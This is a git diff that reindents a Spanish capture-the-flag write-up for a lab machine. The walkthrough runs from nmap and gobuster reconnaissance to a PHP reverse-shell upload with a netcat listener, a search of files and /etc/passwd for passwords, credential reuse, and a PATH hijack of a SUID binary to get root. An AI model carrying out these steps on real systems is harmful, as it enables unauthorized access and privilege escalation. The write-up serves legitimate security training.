@@ -8,7 +8,7 @@ En primer lugar, vamos a comprobar si tenemos conexión
  con la máquina. Y si podemos averiguar el sistema
  operativo que utiliza mediante el ttl.
 
-       ping [Ip Víctima]
+    ping [Ip Víctima]
 
 ![Captura de pantalla -2022-04-12 20-04-31](https://user-images.githubusercontent.com/103068924/163026403-f74332d1-582a-43d0-9cb5-6dc1f4b170dc.png)
 
@@ -17,7 +17,7 @@ En primer lugar, vamos a comprobar si tenemos conexión
  
  Ahora podemos escanear los puertos mediante nmap.
   
-       nmap -p- --open -T5 -n -v [Ip Víctima] -oG allPorts
+    nmap -p- --open -T5 -n -v [Ip Víctima] -oG allPorts
        
 ![Captura de pantalla -2022-04-12 20-11-38](https://user-images.githubusercontent.com/103068924/163026657-0e7a094b-7f45-44ef-9fec-33bd43400f94.png)
  
@@ -44,7 +44,7 @@ En primer lugar, vamos a comprobar si tenemos conexión
 
  Ahora pasaremos a realizar un escaneo más exhaustivo:
  
-        nmap -sC -sV -v -p22,80 [Ip Víctima] -oN target
+     nmap -sC -sV -v -p22,80 [Ip Víctima] -oN target
         
  ![Captura de pantalla -2022-04-12 20-18-19](https://user-images.githubusercontent.com/103068924/163027847-ca47db77-4fdc-4852-ab48-049a2185332e.png)
 
@@ -228,7 +228,7 @@ de GitHub mediante el siguiente enlace: https://github.com/F1r0x/php-reverse-she
 
 Para tenerlo, simplemente lo copiáis, abrís una terminal y crearemos el archivo mediante nano:
 
-              nano php-reverse-shell.php
+    nano php-reverse-shell.php
               
 Pegamos todo el script, guardamos (Cntrl + o) y salimos (Cntrl + x).
 
@@ -244,7 +244,7 @@ en escucha.
 
 Abrimos una terminar y modificamos el archivo php-reverse-shell.php
 
-          sudo nano php-reverse-shell.php
+    sudo nano php-reverse-shell.php
           
           
 ![Captura de pantalla -2022-04-13 12-42-02](https://user-images.githubusercontent.com/103068924/163163832-7a4632e4-a547-4ac4-b3a2-24cb5c7075e7.png)
@@ -252,7 +252,7 @@ Abrimos una terminar y modificamos el archivo php-reverse-shell.php
 Establecemos nuestra Ip (tun0) y el puerto de escucha (en este ejemplo usaremos el 8080). Para saber 
 cuál es nuestra Ip, podemos verlo mediante el comando 'ipconfig':
  
-                         sudo ifconfig
+    sudo ifconfig
                                                  
 ![Captura de pantalla -2022-04-13 13-01-50](https://user-images.githubusercontent.com/103068924/163166666-8c4d0990-f186-4775-be03-71e20fc4cb32.png)
 
@@ -289,7 +289,7 @@ Perfecto, ya tendríamos nuestro archivo subido.
  
  Para ponernos en escucha, abrimos una terminal y ejecutamos el siguiente comando:
  
-                nc -lnvp 8080
+     nc -lnvp 8080
                 
   -l : Sirve para que Netcat abra un puerto y se mantenga ala escucha. Se aceptará una única conexión de un
        único cliente antes de cerrarse.
@@ -313,7 +313,7 @@ así como subdominios DNS.
 
 Para instalarlo simplemente ejecutamos:
 
-             sudo apt install gobuster
+    sudo apt install gobuster
              
   Y también tendremos que descargar los repositorios de direcciones, en esta ocasión utilizaremos un
   repositorio llamado 'wordlists' y en concreto la lista de directorios 'directory-list-2.3-small.txt.
@@ -329,13 +329,13 @@ Para instalarlo simplemente ejecutamos:
   En ese enlace encontraréis la biblioteca que vamos a utilizar, yo recomiendo instalarlo en el siguiente 
   directorio, si el directorio no existe crearlo.:
   
-                 /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt   
+    /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt   
   
   
   Bien, ya tenemos nuestro Gobuster y nuestra biblioteca de directorios, ahora toca lanzar la herramienta a ver
   que nos reporta:
   
-         gobuster dir --url http://[Ip Víctima]/ --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php
+    gobuster dir --url http://[Ip Víctima]/ --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php
   
   Ahora gobuster empezará a realizar pruebas y a mostrarnos resultados a medida que avanza. No tenemos que esperar a
   que finalice, simplemente fijaros en cuales son los directorios que reporta y ir probando a ver cuáles son
@@ -348,13 +348,13 @@ Para instalarlo simplemente ejecutamos:
   En este caso hemos tenido suerte, ya que al poco de buscar ha encontrado una ruta que nos dirige al directorio
   Uploads.
   
-            http://[Ip Víctima]/uploads/
+    http://[Ip Víctima]/uploads/
             
   Una vez hecho esto nos dirigiremos al navegador y trataremos de introducir la siguiente ruta:
    
-            http://[Ip Víctima]/uploads/php-reverse-shell.php
+    http://[Ip Víctima]/uploads/php-reverse-shell.php
             
-   ![Captura de pantalla -2022-04-13 13-46-48](https://user-images.githubusercontent.com/103068924/163173691-3a6ffdf3-68f3-4118-af32-35aaba15b3a4.png)
+![Captura de pantalla -2022-04-13 13-46-48](https://user-images.githubusercontent.com/103068924/163173691-3a6ffdf3-68f3-4118-af32-35aaba15b3a4.png)
 
   Una vez realizado esto, volvemos a la terminal donde se encontraba el 'netcat' y debería de haberse abierto 
   nuestra shell.  
@@ -380,15 +380,14 @@ Para instalarlo simplemente ejecutamos:
 
  Mediante el comando 'cat' podemos ver en la terminal el contenido del archivo:
  
-                   cat user.txt
+     cat user.txt
 
  ![Captura de pantalla -2022-04-13 15-02-39](https://user-images.githubusercontent.com/103068924/163187942-4cde5ee7-b0eb-418c-b192-e719391765f7.png)
 
 Ahora, para poder trabajar de manera más cómoda y tratar de escalarar privilegios, primero, abriremos una shell
 más funcional. Para ello volvemos al directorio principal mediante cd y ejecutamos el siguiente comando:
 
-
-                   python3 -c 'import pty;pty.spawn("/bin/bash")' 
+    python3 -c 'import pty;pty.spawn("/bin/bash")' 
                    
 ![Captura de pantalla -2022-04-21 08-17-19](https://user-images.githubusercontent.com/103068924/164386987-26be3445-32af-43fe-86e4-cb706405152c.png)
 
@@ -415,7 +414,7 @@ Con grep utilizaremos el patrón 'passw' para tratar de roportar todas los resul
 passwd o password por ejemplo). También usaremos -i para ignorar las palabras sensibles a mayúsculas y minúsculas
 como por ejemplo las contraseñas en este caso.
 
-                       cat * | grep -i passw*
+    cat * | grep -i passw*
                        
                        
  ![Captura de pantalla -2022-04-21 08-43-19](https://user-images.githubusercontent.com/103068924/164390666-8ff742dc-30ed-4147-b5f6-9bf5fd216792.png)
@@ -425,14 +424,14 @@ como por ejemplo las contraseñas en este caso.
  Para poder verificar los usuarios disponibles en el sistema, podemos leer el archivo  /etc/passwd y tratar
  de reutilizar la contrasña encontrada en alguna cuenta con altros privilegios.
  
-                        cat /etc/passwd
+    cat /etc/passwd
                         
  ![Captura de pantalla -2022-04-21 08-51-23](https://user-images.githubusercontent.com/103068924/164391835-0f93382c-112b-4f0d-ba0b-c2efab165c22.png)
 
 Podemos ver como tenemos un usuario llamado 'robert'. Vamos a tratar de entrar como este usuario mediante el 
 comando 'su' y con la contraseña previamente encontrada.
 
-                        su robert
+    su robert
                         
 ![Captura de pantalla -2022-04-21 08-56-29](https://user-images.githubusercontent.com/103068924/164392632-a0950c9a-d518-4ba7-a9a0-433173395c23.png)
 
@@ -442,14 +441,14 @@ revisando los archivos ".php" y ".js" de manera manual en busca de algo más.
 
 Tras revisar los cuatro archivos, vemos que en el archivo 'db.php' encontramos la siguiente información:
 
-                       cat db.php
+    cat db.php
                        
 ![Captura de pantalla -2022-04-21 09-02-58](https://user-images.githubusercontent.com/103068924/164393733-c692a948-0f9d-45ce-ac05-e7afab97ff00.png)
 
 Como podéis ver aparecen cuatro palabras que podemos probar como contraseñas, tras probarlas vemos como la 
 contraseña del usuario 'robert' es "M3g4C0rpUs3r!"
 
-                       su robert
+    su robert
                                      
 ![Captura de pantalla -2022-04-21 09-08-58](https://user-images.githubusercontent.com/103068924/164394920-e350b001-4047-4f76-9c31-6097ef72ea92.png)
 
@@ -460,9 +459,9 @@ Finalmente, estamos como el usuario 'robert', podemos comprobarlo utilizando el 
 Ahora podemos ir al directorio principal /home/robert y veremos como ahí está nuestro archivo user.txt con 
 nuestra primera flag que ya habíamos visto anteriormente sin necesidad de ningún privilegio.
 
-                          cd /home/robert
+    cd /home/robert
                           
-                          cat user.txt
+    cat user.txt
                           
 ![Captura de pantalla -2022-04-21 09-12-12](https://user-images.githubusercontent.com/103068924/164396519-93ccff49-d292-4047-9e64-2988711d5187.png)
                    
@@ -472,7 +471,7 @@ Pero nosotros lo que buscamos es la flag del super usuario y para ello debemos d
 
 En primer lugar, trataremos de iniciar sesión como super usuario mediante 'sudo':
 
-            sudo su robert
+    sudo su robert
             
 ![Captura de pantalla -2022-04-21 09-27-12](https://user-images.githubusercontent.com/103068924/164400159-7bc36117-61a0-4dc8-87c4-9e93ab5bb34c.png)
 
@@ -485,13 +484,13 @@ utilizaremos el comando 'id':
 Vemos como el usuario robert es parte del grupo 'bugtracker'. Ahora, intentemos ver si hay algún 
 binario dentro de ese grupo:
 
-                     find / -group bugtracker 2>/dev/null
+    find / -group bugtracker 2>/dev/null
                      
 ![Captura de pantalla -2022-04-21 09-42-23](https://user-images.githubusercontent.com/103068924/164404634-e6d61c58-7fff-4e55-a6f7-b9a0a06aed99.png)
 
 Nos ha reportado un archivo llamado 'bugtracker'. Ahora comprobamos qué privilegio y qué tipo de archivo es:
 
-                      ls -la /usr/bin/bugtracker && file /usr/bin/bugtracker
+    ls -la /usr/bin/bugtracker && file /usr/bin/bugtracker
 
 ![Captura de pantalla -2022-04-21 09-47-02](https://user-images.githubusercontent.com/103068924/164405567-6055d680-b99b-4635-a3ad-a2c54ad77b82.png)
 
@@ -506,7 +505,7 @@ que tiene configurado SUID.
 
 Para ello ejecutamos 'bugtacker':
 
-                /usr/bin/bugtracker 
+    /usr/bin/bugtracker 
             
 ![Captura de pantalla -2022-04-21 09-57-05](https://user-images.githubusercontent.com/103068924/164786353-6e21c5ef-1b8e-465b-808e-371ac1f3b293.png)
 
@@ -518,20 +517,20 @@ La herramienta acepta la entrada del usuario como nombre del archivo que se leer
 
 Para ello nos dirigiremos al directorio '/tmp':
  
-            cd /tmp
+    cd /tmp
             
 ![Captura de pantalla -2022-04-21 10-49-05](https://user-images.githubusercontent.com/103068924/164787581-b841e8fc-9f0c-4d90-bc2c-22f9c44b40d3.png)
 
 
 Y crearemos un archivo 'cat' que contenga la siguiente ruta '/bin/sh':
 
-            echo '/bin/sh' > cat
+    echo '/bin/sh' > cat
             
  ![Captura de pantalla -2022-04-21 10-49-22](https://user-images.githubusercontent.com/103068924/164787634-3a48e291-f6e5-4415-8bbb-54f197c02657.png)
       
 Ahora le tenemos que dar privilegios de ejecución:
 
-            chmod +x cat
+    chmod +x cat
             
 ![Captura de pantalla -2022-04-21 10-49-52](https://user-images.githubusercontent.com/103068924/165099961-3373a75c-d7b5-4f97-b733-9df7805772fd.png)
 
@@ -543,13 +542,13 @@ PATH es una variable de entorno en sistemas operativos similares a Unix, DOS, OS
 Por tanto, debemos introducir el directorio 'tmp' en el archivo PATH
 para poder ejecutarlo correctamente. Para ello utilizamos el siguiente comando:
 
-            export PATH=/tmp:$PATH
+    export PATH=/tmp:$PATH
 
 ![Captura de pantalla -2022-04-21 10-48-24](https://user-images.githubusercontent.com/103068924/165100226-c25d5a72-39a6-4083-9aa4-1d58c4a85179.png)
  
 Para confirmar que todo ha salido correctamente y verificar que el directorio 'tmp' está en PATH:
 
-           echo $PATH
+    echo $PATH
            
 
 ![Captura de pantalla -2022-04-25 15-40-24](https://user-images.githubusercontent.com/103068924/165100883-46db8497-56b3-4782-9343-7d6947b4a26d.png)
@@ -562,11 +561,11 @@ Genial, ya estamos registrados como 'root'. Finalmente, nos dirigimos al directo
 
 Para poder leer el archvio nos registramos como super usuarios:
 
-          sudo su
+    sudo su
           
 Y abrimos el archivo con 'cat' donde encontramos la última Flag:
 
-          cat root.txt
+    cat root.txt
           
  
  ![background2](https://user-images.githubusercontent.com/103068924/165103059-55b4a1b6-f646-46aa-8b5a-47a804187541.png)
